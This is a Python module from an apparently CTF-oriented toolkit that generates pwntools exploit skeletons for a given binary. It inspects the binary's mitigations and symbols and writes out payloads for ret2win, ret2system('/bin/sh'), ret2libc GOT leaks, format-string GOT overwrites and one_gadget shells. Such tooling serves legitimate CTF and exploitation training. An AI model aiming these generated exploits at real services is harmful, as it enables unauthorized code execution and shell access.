"""Generate a tailored pwntools exploit skeleton for a binary."""
import os
import stat

from .checksec import silent_sec
from .elf import (BACKDOOR_HINTS, DANGEROUS, HAVE_PWNTOOLS, get_symbols,
                  load_binary)
from .ui import C, good, info, warn

EXPLOIT_TEMPLATE = r'''#!/usr/bin/env python3
# Exploit skeleton generated by ctfkit for: {binname}
# Target heuristic: {vulnhint}
from pwn import *

context.binary = exe = ELF("{binpath}", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]  # adjust to your setup
# context.log_level = "debug"

HOST = "{host}"
PORT = {port}

gdbscript = """
# break *vuln
# break *main+123
continue
""".strip()


def start():
    """Return a connected tube. Usage:
        python3 {outname}            -> local process
        python3 {outname} GDB        -> local + gdb
        python3 {outname} REMOTE     -> connect to HOST:PORT
    """
    if "REMOTE" in sys.argv[1:]:
        return remote(HOST, PORT)
    if "GDB" in sys.argv[1:]:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    return process([exe.path])


# ---- recon helpers -------------------------------------------------------
# Known mitigations for this binary:
#   RELRO={relro}  Canary={canary}  NX={nx}  PIE={pie}
#
{offset_block}
# ---- gadgets / symbols (auto-filled) -------------------------------------
{symbols_block}

def exploit():
    io = start()

{body}

    io.interactive()


if __name__ == "__main__":
    exploit()
'''


def gen_offset_block(sec, offset=None):
    if offset is not None:
        note = ("# NOTE: a canary is enabled, so this offset likely reaches the\n"
                "#       canary, not saved RIP directly -- verify before use.\n"
                if sec["canary"] else "")
        return (f"{note}OFFSET = {offset}  # auto-found by ctfkit (cyclic via gdb)")
    if sec["canary"]:
        return ("# Stack canary present: you must leak it first and keep it intact.\n"
                "# offset = cyclic_find(...)  # distance to the canary, not to RIP\n"
                "# Typical layout: [buf][canary][saved rbp][saved rip]\n"
                "OFFSET = 0  # TODO: find offset to canary via cyclic")
    return ("# No canary: find distance from your input to saved RIP.\n"
            "#   ctfkit offset <bin>   (or: sendline(cyclic(200)) then cyclic_find)\n"
            "OFFSET = 0  # TODO: set the overflow offset to saved RIP")


def gen_symbols_block(pelf, local, wins, hits, sec, libc_path=None, onegadgets=None):
    """Return (text, meta). meta tells gen_body which names are defined."""
    lines = []
    meta = {"system": False, "leak": None, "rop": False, "win": None,
            "libc": False, "onegadget": False}
    if wins:
        lines.append("# Candidate win/backdoor functions:")
        for name, addr in wins[:8]:
            tag = "" if sec["pie"] else "  # fixed (no PIE)"
            lines.append(f"WIN_{name.upper()} = {hex(addr)}{tag}")
        meta["win"] = wins[0][0]
    if "system" in hits:
        lines.append("# system@plt available:")
        lines.append("try:\n    SYSTEM_PLT = exe.plt['system']\n"
                     "except Exception:\n    SYSTEM_PLT = 0")
        meta["system"] = True
    if pelf is not None:
        for fn in ("puts", "printf", "write"):
            if pelf.plt and fn in pelf.plt and pelf.got and fn in pelf.got:
                lines.append(f"{fn.upper()}_PLT = exe.plt['{fn}']   # for GOT leak")
                lines.append(f"{fn.upper()}_GOT = exe.got['{fn}']")
                meta["leak"] = fn
                break
    if not sec["pie"]:
        lines.append("")
        lines.append("rop = ROP(exe)")
        lines.append("try:\n    POP_RDI = rop.find_gadget(['pop', 'rdi', 'ret'])[0]\n"
                     "except Exception:\n    POP_RDI = 0")
        lines.append("RET = (rop.find_gadget(['ret']) or [0])[0]  # stack alignment")
        meta["rop"] = True
    if libc_path:
        lines.append("")
        lines.append(f'libc = ELF("{libc_path}", checksec=False)')
        meta["libc"] = True
        if onegadgets:
            lines.append("# one_gadget offsets -> execve('/bin/sh'); satisfy constraints:")
            for g in onegadgets[:6]:
                cons = "; ".join(g["constraints"]) or "no constraints"
                lines.append(f"#   {hex(g['offset'])}  [{cons}]")
            joined = ", ".join(hex(g["offset"]) for g in onegadgets[:6])
            lines.append(f"ONE_GADGETS = [{joined}]  # add libc.address at runtime")
            meta["onegadget"] = True
    text = "\n".join(lines) if lines else "# (no symbols auto-detected; stripped?)"
    return text, meta


def gen_body(sec, hits, wins, meta):
    h = set(hits)
    lines = ["    # ====== BUILD PAYLOAD ======"]
    if sec["pie"]:
        lines.append("    # PIE is on -> you need a leak first. Pseudocode:")
        lines.append("    #   io.recvuntil(b'leak: '); leak = int(io.recvline(), 16)")
        lines.append("    #   exe.address = leak - exe.symbols['<known_sym>']")
        lines.append("")

    overflow_like = ("gets" in h or "read" in h or "scanf" in h
                     or "__isoc99_scanf" in h or not sec["canary"])
    if overflow_like:
        if meta["win"] and not sec["pie"]:
            name = meta["win"]
            lines.append(f"    # ret2win -> {name}")
            lines.append("    payload  = b'A' * OFFSET")
            if meta["rop"]:
                lines.append("    payload += p64(RET)                  # 16-byte align")
            lines.append(f"    payload += p64(WIN_{name.upper()})")
            lines.append("    io.sendline(payload)")
        elif meta["system"] and meta["rop"]:
            lines.append("    # ret2system(\"/bin/sh\")")
            lines.append("    binsh = next(exe.search(b'/bin/sh'), 0)  # or point to libc")
            lines.append("    payload  = b'A' * OFFSET")
            lines.append("    payload += p64(POP_RDI) + p64(binsh)")
            lines.append("    payload += p64(RET)")
            lines.append("    payload += p64(SYSTEM_PLT)           # or libc.symbols['system']")
            lines.append("    io.sendline(payload)")
        elif meta["leak"] and meta["rop"]:
            fn = meta["leak"].upper()
            lines.append(f"    # ret2libc via leak ({meta['leak']} leak pattern):")
            lines.append(f"    # 1) leak a libc address by calling "
                         f"{meta['leak']}({meta['leak']}@got)")
            lines.append("    payload  = b'A' * OFFSET")
            lines.append(f"    payload += p64(POP_RDI) + p64({fn}_GOT)")
            lines.append(f"    payload += p64({fn}_PLT)")
            lines.append("    payload += p64(exe.symbols.get('main', exe.entry))  # back to main")
            lines.append("    io.sendline(payload)")
            lines.append("    # leak = u64(io.recvline().strip().ljust(8, b'\\x00'))")
            lines.append(f"    # libc.address = leak - libc.symbols['{meta['leak']}']")
            lines.append("    # 2) second payload: system('/bin/sh')")
        else:
            lines.append("    # Stack overflow confirmed, but no obvious leak / gadget")
            lines.append("    # was auto-detected. Steps:")
            lines.append("    #   - find OFFSET with cyclic")
            lines.append("    #   - if NX off: jump to shellcode (asm(shellcraft.sh()))")
            lines.append("    #   - else: find a leak (puts/printf) or a win function")
            lines.append("    payload  = b'A' * OFFSET")
            if not sec["nx"]:
                lines.append("    # NX is OFF -> shellcode on stack is viable:")
                lines.append("    # sc = asm(shellcraft.amd64.linux.sh())")
                lines.append("    # payload += p64(STACK_ADDR) + sc")
            lines.append("    payload += p64(0xdeadbeef)  # TODO: target address")
            lines.append("    io.sendline(payload)")
    elif {"printf", "fprintf", "snprintf"} & h:
        lines.append("    # Format string. Find your offset on the stack:")
        lines.append("    #   io.sendline(b'AAAA' + b'.%p' * 20)  # look for 41414141")
        lines.append("    OFFSET_FMT = 6  # TODO")
        lines.append("    # Arbitrary write with fmtstr_payload:")
        lines.append("    # payload = fmtstr_payload(OFFSET_FMT, {exe.got['printf']: WIN_ADDR})")
        lines.append("    # io.sendline(payload)")
    elif {"malloc", "free"} & h:
        lines.append("    # Heap challenge. Wrap the menu actions, e.g.:")
        lines.append("    def alloc(idx, size, data):")
        lines.append("        io.sendlineafter(b'> ', b'1')")
        lines.append("        # ... fill in based on the menu ...")
        lines.append("    # Then exploit tcache/UAF/double-free as the bug allows.")
    else:
        lines.append("    payload = b'A' * OFFSET")
        lines.append("    io.sendline(payload)")
    if meta.get("onegadget"):
        lines.append("")
        lines.append("    # --- one_gadget alternative (once you know libc.address) ---")
        lines.append("    # og = libc.address + ONE_GADGETS[0]   # pick one whose constraints hold")
        lines.append("    # io.sendline(b'A' * OFFSET + p64(og))")
    lines.append("")
    lines.append("    io.recvall(timeout=1)")
    return "\n".join(lines)


def short_vulnhint(sec, h, wins):
    if "gets" in h:
        return "stack BOF (gets)"
    if wins and "system" in h:
        return "ret2win / system backdoor"
    if {"printf", "fprintf"} & h:
        return "format string"
    if {"malloc", "free"} & h:
        return "heap"
    if not sec["canary"] and ("read" in h or "scanf" in h):
        return "stack BOF"
    return "unknown - inspect manually"


def generate_exploit(path, outpath, host, port, auto_offset=False, off_len=200,
                     libc=None, libc_leak=None):
    pelf, mini = load_binary(path)
    sec = silent_sec(pelf, mini)
    local, imported = get_symbols(pelf, mini)
    hits = [fn.split("@")[0] for fn in imported if fn.split("@")[0] in DANGEROUS]
    wins = [(n, a) for n, a in sorted(local.items(), key=lambda x: x[1])
            if BACKDOOR_HINTS.search(n) and not n.startswith("_")]

    offset = None
    if auto_offset:
        from .offset import find_offset  # local import: only needed on demand
        info(f"auto-offset: running target under gdb ({off_len}-byte cyclic)...")
        offset, ometa = find_offset(path, length=off_len)
        if offset is not None:
            good(f"auto-offset: OFFSET = {offset} (method: {ometa['method']})")
        else:
            warn(f"auto-offset failed ({ometa.get('error') or 'no pattern in crash'});"
                 " leaving OFFSET = 0")

    if libc_leak and not libc:
        from .libcid import identify_and_download, parse_leaks  # on demand
        try:
            leaks = parse_leaks(libc_leak)
        except ValueError as e:
            warn(f"--libc-leak: {e}")
            leaks = None
        if leaks:
            info("identifying libc via libc.rip and downloading it ...")
            dest_dir = os.path.dirname(outpath) or "."
            lpath, match, lerr = identify_and_download(leaks, dest_dir)
            if lpath:
                good(f"libc: {match.get('id')} -> {lpath}")
                libc = lpath
            else:
                warn(f"libc auto-fetch failed ({lerr}); continuing without libc")

    onegadgets = None
    if libc:
        from .onegadget import find as find_onegadgets  # on demand
        onegadgets, oerr = find_onegadgets(libc)
        if onegadgets:
            good(f"one_gadget: embedded {len(onegadgets)} gadget(s) from {libc}")
        elif oerr:
            warn(f"one_gadget: {oerr}")

    vulnhint = short_vulnhint(sec, set(hits), wins)
    symbols_block, meta = gen_symbols_block(
        pelf, local, wins, hits, sec,
        libc_path=libc.replace("\\", "/") if libc else None,
        onegadgets=onegadgets,
    )
    script = EXPLOIT_TEMPLATE.format(
        binname=os.path.basename(path),
        binpath=path.replace("\\", "/"),
        outname=os.path.basename(outpath),
        vulnhint=vulnhint,
        host=host, port=port,
        relro=sec["relro"], canary=sec["canary"], nx=sec["nx"], pie=sec["pie"],
        offset_block=gen_offset_block(sec, offset=offset),
        symbols_block=symbols_block,
        body=gen_body(sec, hits, wins, meta),
    )
    with open(outpath, "w", encoding="utf-8") as f:
        f.write(script)
    try:
        os.chmod(outpath, os.stat(outpath).st_mode | stat.S_IEXEC)
    except Exception:
        pass
    good(f"Exploit skeleton written to {C.BOLD}{outpath}{C.RST}")
    info(f"Heuristic: {vulnhint}")
    if not HAVE_PWNTOOLS:
        warn("pwntools not installed here; the script still needs it to run.")


def cmd_pwn(path, out, host, port, auto_offset=False, off_len=200, libc=None,
           libc_leak=None):
    generate_exploit(path, out, host, port, auto_offset=auto_offset,
                     off_len=off_len, libc=libc, libc_leak=libc_leak)
